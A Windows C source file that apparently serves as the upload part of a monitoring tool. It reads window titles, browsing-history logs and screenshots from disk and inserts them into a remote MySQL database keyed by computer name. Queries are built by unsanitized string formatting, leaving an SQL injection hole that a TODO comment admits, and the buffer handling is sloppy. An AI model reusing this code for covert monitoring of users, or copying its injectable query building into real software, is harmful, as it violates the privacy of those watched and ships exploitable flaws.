#include "database.h"

DWORD WINAPI GetFullBrowseQuery(
	_In_ SIZE_T cbLogList,
	_In_reads_(cbLogList) CHAR *szTitleList,
	_Out_ CHAR **szQuery
)
{
	HANDLE hHeap = GetProcessHeap();
	const SIZE_T cbQuery = 200 + (cbLogList * 2);
	CHAR cmpName[30];
	CHAR *context = NULL, *line = NULL;
	int i = 0;
	*szQuery = (CHAR *)HeapAlloc(hHeap, 0, cbQuery);
	if(*szQuery == NULL)
	{
		return ERROR_OUTOFMEMORY;
	}

	GetEnvironmentVariableA("COMPUTERNAME", cmpName, 29);
	StringCbPrintfA(*szQuery, cbQuery, "INSERT IGNORE INTO trafficlog (origin, url, dt) VALUES");
	line = strtok_s(szTitleList, "\n", &context);
	while(line != NULL)
	{
		CHAR row[200];
		if(line[strcspn(line, "\r")])
		{
			line[strcspn(line, "\r")] = '\0';
		}
		StringCchPrintfA(row, 200, "%c(\'%s\', \'%s\', NOW())", i ? ',' : ' ', cmpName, line);
		StringCbCatA(*szQuery, cbQuery, row);
		line = strtok_s(NULL, "\n", &context);
		i++;
	}

	return ERROR_SUCCESS;
}

DWORD WINAPI GetFullTitleQuery(
	_In_ SIZE_T cbTitleList,
	_In_reads_(cbTitleList) CHAR *szTitleList,
	_Out_ CHAR **szQuery
)
{
	HANDLE hHeap = GetProcessHeap();
	const SIZE_T cbQuery = cbTitleList + 200;
	CHAR cmpName[30];

	*szQuery = (CHAR *)HeapAlloc(hHeap, 0, cbQuery);
	if(*szQuery == NULL)
	{
		return ERROR_OUTOFMEMORY;
	}
	
	GetEnvironmentVariableA("COMPUTERNAME", cmpName, 29);
	StringCbPrintfA(*szQuery, cbQuery, "INSERT INTO windowtitles (origin, titlelist, dt) VALUES(\'%s\', \'%s\', NOW());", cmpName, szTitleList);
	return ERROR_SUCCESS;
}

_Check_return_
_Post_equals_last_error_
DWORD WINAPI LoadASCIIFile(
	_In_reads_or_z_(MAX_PATH) WCHAR *wszFileName,
	_Out_ SIZE_T *cbBuffer,
	_Outptr_ CHAR **szBuffer
)
{
	HANDLE hFile = CreateFileW(wszFileName, GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL),
		hHeap = GetProcessHeap();
	LARGE_INTEGER liSize;
	DWORD dwRead;
	SIZE_T i;

	if(hFile == INVALID_HANDLE_VALUE)
	{
		return GetLastError();
	}

	GetFileSizeEx(hFile, &liSize);

	if(liSize.HighPart != 0 || liSize.LowPart > 65536)
	{
		return ERROR_FILE_TOO_LARGE;
	}
	
	*cbBuffer = liSize.LowPart;

	*szBuffer = (CHAR *)HeapAlloc(hHeap, 0, *cbBuffer);
	ReadFile(hFile, *szBuffer, *cbBuffer, &dwRead, NULL);
	if(dwRead != *cbBuffer)
	{
		return ERROR_INSUFFICIENT_BUFFER;
	}

	// Sanitize the string and replace non-ASCII chars with ?
	for(i = 0; i < *cbBuffer; i++)
	{
		if(
			((*szBuffer)[i] < ' ' || (*szBuffer)[i] > '~')
			&& 
			(*szBuffer)[i] != '\t' && (*szBuffer)[i] != '\r' && (*szBuffer)[i] != '\n'
		)
		{
			(*szBuffer)[i] = '?';
		}
		// TAB (0x9)
		// LF (0xA)
		// CR (0xD)
		// 0x20 - 0x7E
		if((*szBuffer)[i] == '\'' || (*szBuffer)[i] == '\"' || (*szBuffer)[i] == '\\')
			(*szBuffer)[i] = ' ';
	}


	CloseHandle(hFile);
	return ERROR_SUCCESS;

}

// TODO: Add string sanitization for input from COMPUTERNAME
DWORD WINAPI GetFullSSQueryString(
	_In_ SIZE_T cbPngBits,
	_In_reads_(cbPngBits) BYTE *pbBits,
	_Out_writes_(2 * cbPngBits + 100) CHAR **szQuery
)
{
	HANDLE hHeap = GetProcessHeap();
	SIZE_T i;

	// 200 for the buffer, 2*bits for the 2 hex chars (0x__) per byte
	const SIZE_T cbQuery = 200 + (2 * cbPngBits);
	CHAR cmpName[30];
	const CHAR hex[] = "0123456789ABCDEF";
	UINT uLen;

	*szQuery = (CHAR *)HeapAlloc(hHeap, 0, cbQuery);
	if(*szQuery == NULL)
	{
		return ERROR_OUTOFMEMORY;
	}

	GetEnvironmentVariableA("COMPUTERNAME", cmpName, 29);

	StringCbPrintfA(*szQuery, cbQuery, "INSERT IGNORE INTO screenshot (origin, pngbytes, dt) VALUES (\'%s\', X\'", cmpName);
	StringCchLengthA(*szQuery, cbQuery * sizeof(CHAR), &uLen);
	for(i = 0; i < cbPngBits; i++)
	{	
		(*szQuery)[uLen]     = hex[pbBits[i] >> 4];
		(*szQuery)[uLen + 1] = hex[pbBits[i] & 0xF];
		uLen += 2;
	}

	// so we can Cat on the end
	(*szQuery)[uLen] = '\0';

	StringCbCatA(*szQuery, cbQuery, "\', NOW());");
	return ERROR_SUCCESS;
}

_Check_return_
_Post_equals_last_error_
__drv_allocatesMem(Mem)
DWORD WINAPI GetPNGBits(
	WCHAR *wszFilePath,
	BYTE **pbBits,
	PLARGE_INTEGER pliFileSize
)
{
	HANDLE hFile = CreateFileW(wszFilePath, GENERIC_READ, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL),
		hHeap = GetProcessHeap();
	DWORD dwRead;
	
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return GetLastError();
	}

	if(!GetFileSizeEx(hFile, pliFileSize))
	{
		return GetLastError();
	}

	if(pliFileSize->HighPart > 0 || pliFileSize->LowPart > MYSQL_MEDIUMBLOB_MAX)
	{
		return ERROR_FILE_TOO_LARGE;
	}

	*pbBits = (BYTE *)HeapAlloc(hHeap, 0, pliFileSize->LowPart);
	if(*pbBits == NULL)
	{
		return ERROR_OUTOFMEMORY;
	}

	if(ReadFile(hFile, *pbBits, pliFileSize->LowPart, &dwRead, NULL) == FALSE)
	{
		return GetLastError();
	}

	CloseHandle(hFile);
	return ERROR_SUCCESS;
}

_Post_satisfies_(*lpMem == NULL)
VOID WINAPI SafeHeapFree(
	LPVOID *lpMem
)
{
	HANDLE hHeap = GetProcessHeap();
	HeapFree(hHeap, 0, *lpMem);
	*lpMem = NULL;
}

INT WINAPI InsertTitleList(WCHAR *wszFileName)
{
	CHAR *szQuery = NULL;
	CHAR *szTitleList = NULL;
	LARGE_INTEGER liSize;
	MYSQL *conn = NULL;
	PROGRAM_OPTIONS opt;
	ReadRegistrySettings(&opt);

	LoadASCIIFile(wszFileName, &liSize.LowPart, &szTitleList);
	GetFullTitleQuery(liSize.LowPart, szTitleList, &szQuery);

	conn = mysql_init(NULL);
	mysql_real_connect(conn, opt.wDBServer, opt.wDBUser, opt.wDBPass, opt.wDBName, 0, NULL, 0);
	mysql_query(conn, szQuery);
	mysql_close(conn);

	SafeHeapFree(&szTitleList);
	SafeHeapFree(&szQuery);

	return 1;
}

INT WINAPI InsertBrowseHistory(WCHAR *wszFileName)
{
	CHAR *szQuery = NULL;
	LARGE_INTEGER liSize;
	CHAR *szLog = NULL;
	MYSQL *conn = NULL;
	PROGRAM_OPTIONS opt;
	ReadRegistrySettings(&opt);

	LoadASCIIFile(wszFileName, &liSize.LowPart, &szLog);
	GetFullBrowseQuery(liSize.LowPart, szLog, &szQuery);
	{
		// avoid .txt so doesn't get inserted as title list
		HANDLE hFile = CreateFileW(L"browsequery.ttt", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD dwWritten; 
		CONST CHAR cCRLF[2] = { '\r', '\n' };
		UINT uLen;

		SetFilePointer(hFile, 0, NULL, FILE_END);
		StringCbLengthA(szQuery, STRSAFE_MAX_CCH * sizeof(CHAR), &uLen);
		WriteFile(hFile, szQuery, uLen, &dwWritten, NULL);
		WriteFile(hFile, cCRLF, 2, &dwWritten, NULL);
		CloseHandle(hFile);
	}

	conn = mysql_init(NULL);
	mysql_real_connect(conn, opt.wDBServer, opt.wDBUser, opt.wDBPass, opt.wDBName, 0, NULL, 0);
	mysql_query(conn, szQuery);
	mysql_close(conn);

	SafeHeapFree(&szLog);
	SafeHeapFree(&szQuery);

	return 1;
}

INT WINAPI InsertScreenshot(WCHAR *wszFileName)
{
	CHAR *szQuery = NULL;
	BYTE *pbImgBits = NULL;
	LARGE_INTEGER liSize;
	MYSQL *conn = NULL;
	PROGRAM_OPTIONS opt;
	//DWORD dwError;
	ReadRegistrySettings(&opt);


	GetPNGBits(wszFileName, &pbImgBits, &liSize);
	GetFullSSQueryString(liSize.LowPart, pbImgBits, &szQuery);

	conn = mysql_init(NULL);
	mysql_real_connect(conn, opt.wDBServer, opt.wDBUser, opt.wDBPass, opt.wDBName, 0, NULL, 0);
	mysql_query(conn, szQuery);
	mysql_close(conn);

	SafeHeapFree(&pbImgBits);
	SafeHeapFree(&szQuery);

	return 1;
}